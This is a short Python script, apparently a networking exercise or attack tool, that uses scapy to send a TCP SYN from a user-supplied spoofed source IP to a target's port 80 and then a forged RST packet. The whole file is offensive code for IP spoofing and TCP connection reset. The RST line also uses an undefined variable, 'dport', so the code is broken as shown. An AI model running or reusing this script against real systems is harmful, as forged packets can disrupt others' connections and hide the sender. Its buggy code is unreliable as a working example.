from __future__ import print_function
from scapy.all import *
import sys

if sys.version_info < (3,0):
  input = raw_input

src = input('Enter Spoofed IP:\t')
dst = input('Enter Target IP:\t')

IP1 = IP(src=src, dst=dst)
TCP1 = TCP(sport=1024, dport=80, flags='S', seq=12345)
pkt = IP1 / TCP1
p = sr1(pkt, inter=1)
p.show()

rs1 = TCP(sport=1024, dport=dport, flags='R', seq=12347)
pkt1 = IP1 / rs1
p1 = sr1(pkt1)
p1.show()